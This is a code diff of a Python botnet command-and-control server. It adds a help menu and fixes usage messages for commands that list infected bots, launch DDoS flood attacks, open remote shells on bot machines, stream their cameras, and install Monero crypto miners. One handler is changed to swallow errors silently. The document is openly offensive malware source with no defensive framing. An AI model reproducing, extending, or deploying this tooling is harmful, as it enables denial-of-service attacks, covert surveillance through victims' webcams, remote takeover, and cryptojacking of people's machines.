@@ -38,7 +38,7 @@ title = r"""
 ╚════██║   ██║   ██╔══██╗██╔══██║  ╚██╔╝  ██║╚██╗██║██╔══╝     ██║   
 ███████║   ██║   ██║  ██║██║  ██║   ██║   ██║ ╚████║███████╗   ██║   
 ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝
-                      [cyan]Created by User ;) ~ v1[/cyan]     
+                      [cyan]Created by Glob ~ v1[/cyan]     
 """
 
 # Remove everything displayed in the terminal
@@ -113,7 +113,8 @@ async def handle_client(reader:asyncio.StreamReader, writer:asyncio.StreamWriter
                 elif b"miner-marker":
                     console.print()
             except Exception as e:
-                console.print(f"[red](-) Error: {e}[/red]")
+                return
+                #console.print(f"[red](-) Error: {e}[/red]")
     except (asyncio.CancelledError, ConnectionRefusedError, asyncio.exceptions.IncompleteReadError, ConnectionResetError) as e:
         console.print(f"[red](-) Connection Error: {e}[/red]")
     except Exception as e:
@@ -140,7 +141,7 @@ async def parse_command(command:str):
         
         command = tokens[0]
         if command == "help":
-            console.print("[INSERT HELP]")
+            output_help()
         elif command == "clear":
             main_gui()
         elif command == "ls":
@@ -181,7 +182,7 @@ async def get_info(tokens:list):
         console.print(f"[cyan]Client ID: {client.id}[/cyan]")
         console.print(f"[cyan]IP: {client.ip}[/cyan]")
     except (ValueError, IndexError):
-        console.print("[red](-) Formatting error: 'interact -id (USER_ID)'[/red]")
+        console.print("[red](-) Formatting error: 'info -id (USER_ID)'[/red]")
 
 # Remove the client from the server
 async def do_remove(tokens:list):
@@ -193,7 +194,7 @@ async def do_remove(tokens:list):
         client.writer.close()
         console.print("[cyan](*) Removed user[cyan]")
     except (ValueError, IndexError):
-        console.print("[red](-) Formatting error: 'remove -id (USER_ID)'[/red]")
+        console.print("[red](-) Formatting error: 'rm -id (USER_ID)'[/red]")
 
 # Start a flood attack (DDOS)
 async def flood(tokens:list):
@@ -314,6 +315,59 @@ def miner(tokens:list):
         console.print("[cyan](*) Setting up crypto miner[/cyan]")
     except (ValueError, IndexError):
         console.print("[red](-) Formatting Error: 'miner -id (ID/ALL) -xmraddr (XMR ADRESS)[/red]'")
+    
+def output_help():
+    console.print("""
+[bright_red]╔═════════════════════════════════════════════╗
+║                [cyan]- HELP MENU -[bright_red]                ║
+╚═════════════════════════════════════════════╝
+
+This tool empowers you to manage connected bots, launch attacks, and interact with client systems remotely.
+Through this interface, you have control over various commands and functionalities, enabling you to:
+- Initiate, stop, and monitor attacks such as floods (DDOS) to specified targets.
+- Access connected bots' information, including IDs and IP addresses.
+- Establish a shell connection to a specific client system for direct interaction.
+- Execute commands on clients to perform various actions, such as setting up crypto miners.
+- Stream camera feed from bot systems to monitor activities.
+- Control connected bots and manage their connections effectively.
+
+╔═════════════════════════════════════════════╗
+║                 [cyan]- COMMANDS -[bright_red]                ║
+╚═════════════════════════════════════════════╝
+[cyan]help:[bright_red] Display this help message to view available commands and their functionalities.
+    [cyan]- Usage: 'help'[bright_red]
+
+[cyan]clear:[bright_red] Clear the terminal screen for better visibility and interaction.
+    [cyan]- Usage: 'clear'[bright_red]
+
+[cyan]ls:[bright_red] List all currently connected bots, displaying their IDs and IP addresses.
+    [cyan]- Usage: 'ls'[bright_red]
+
+[cyan]info:[bright_red] - Fetch detailed information about a specific bot using its assigned ID.
+    [cyan]- Usage: 'info -id (USER_ID)'[bright_red]
+
+[cyan]rm:[bright_red] - Remove a bot from the server by specifying its unique ID.
+    [cyan]- Usage: 'rm -id (USER_ID)'[bright:red]
+
+[cyan]flood:[bright_red] - Launch a flood attack (DDOS) by targeting an IP address and port.
+    [cyan]- Usage: 'flood -ip (IP_ADDRESS) -port (PORT)'[bright_red]
+
+[cyan]stop_flood:[bright_red] - Halt an ongoing flood attack initiated on the specified target, 
+    can only be ran if a flood has been started already.
+    [cyan]- Usage: 'stop_flood'[bright_red]
+    
+[cyan]shell:[bright_red] - Open a shell to access and interact with a bot's system using its ID.
+    [cyan]- Usage: 'shell -id (USER_ID)'[bright_red]
+
+[cyan]stream_cam:[bright_red] - Stream the camera feed from a bot's system for monitoring purposes.
+    [cyan]- Usage: 'stream_cam -id (USER_ID)'[bright_red]
+
+[cyan]miner:[bright_red] - Set up a crypto miner on one or multiple bot systems for mining operations.
+    [cyan]- Usage: 'miner -id (USER_ID/ALL) -xmraddr (XMR_ADDRESS)'[bright_red]
+
+[cyan]quit:[bright_red] - Exit and close the Command and Control Server.
+    [cyan]- Usage: 'quit'[bright_red]
+""")
     
 if __name__ == "__main__":
     try:
